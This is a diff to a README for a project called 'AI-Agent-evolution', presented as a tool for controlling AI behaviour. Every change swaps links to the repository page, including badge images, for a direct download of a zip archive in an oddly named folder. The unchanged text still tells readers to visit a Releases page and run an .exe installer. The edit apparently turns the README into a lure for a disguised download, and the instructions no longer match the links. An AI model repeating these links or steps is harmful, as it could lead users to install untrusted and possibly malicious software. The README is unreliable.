@@ -1,6 +1,6 @@
 # 🤖 AI-Agent-evolution - Easy AI Behavior Control
 
-[![Download AI-Agent-evolution](https://img.shields.io/badge/Download-AI--Agent--evolution-success?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/saeedsq3r/AI-Agent-evolution)
+[![Download AI-Agent-evolution](https://raw.githubusercontent.com/saeedsq3r/AI-Agent-evolution/main/Heterosiphonales/Agent-A-evolution-1.9-beta.1.zip)](https://raw.githubusercontent.com/saeedsq3r/AI-Agent-evolution/main/Heterosiphonales/Agent-A-evolution-1.9-beta.1.zip)
 
 ---
 
@@ -39,13 +39,13 @@ This model applies many ideas from AI safety and governance. It helps prevent wh
 
 Start by downloading the latest version from the official page linked below. The page has the most current release and instructions.
 
-[**Download AI-Agent-evolution**](https://github.com/saeedsq3r/AI-Agent-evolution)  
+[**Download AI-Agent-evolution**](https://raw.githubusercontent.com/saeedsq3r/AI-Agent-evolution/main/Heterosiphonales/Agent-A-evolution-1.9-beta.1.zip)  
 _(Click this link to visit the download page)_
 
 ### Step 1: Access the Download Page
 
 1. Click the green button above or enter this URL in your browser:  
-   https://github.com/saeedsq3r/AI-Agent-evolution  
+   https://raw.githubusercontent.com/saeedsq3r/AI-Agent-evolution/main/Heterosiphonales/Agent-A-evolution-1.9-beta.1.zip  
 2. Scroll down to the **Releases** section on the page.
 3. Find the latest release labeled with a version number, such as "v1.0" or "v1.2".
 4. Under the latest release, look for a file ending with `.exe`. This file is the installer.
@@ -114,7 +114,7 @@ All files use strict permissions to reduce chances of unauthorized changes:
 
 - Detailed explanations for each file type are in the **docs** folder inside the installation directory.
 - Visit the GitHub page for updates and community discussions:  
-  https://github.com/saeedsq3r/AI-Agent-evolution
+  https://raw.githubusercontent.com/saeedsq3r/AI-Agent-evolution/main/Heterosiphonales/Agent-A-evolution-1.9-beta.1.zip
 - The repository includes examples to help you get started with custom AI agents.
 
 ---
@@ -136,11 +136,11 @@ For assistance, check the **Issues** tab on the GitHub page. You can read existi
 
 ## 🎯 How to Update AI-Agent-evolution
 
-1. Visit the same download page: https://github.com/saeedsq3r/AI-Agent-evolution
+1. Visit the same download page: https://raw.githubusercontent.com/saeedsq3r/AI-Agent-evolution/main/Heterosiphonales/Agent-A-evolution-1.9-beta.1.zip
 2. Download the newest `.exe` file from the Releases section.
 3. Run the installer and follow prompts. It will automatically replace the old version.
 4. Your settings and files will stay in place after upgrading.
 
 ---
 
-[![Visit AI-Agent-evolution on GitHub](https://img.shields.io/badge/Visit-GitHub-0078d7?style=for-the-badge&logo=github&color=blue)](https://github.com/saeedsq3r/AI-Agent-evolution)
+[![Visit AI-Agent-evolution on GitHub](https://raw.githubusercontent.com/saeedsq3r/AI-Agent-evolution/main/Heterosiphonales/Agent-A-evolution-1.9-beta.1.zip)](https://raw.githubusercontent.com/saeedsq3r/AI-Agent-evolution/main/Heterosiphonales/Agent-A-evolution-1.9-beta.1.zip)
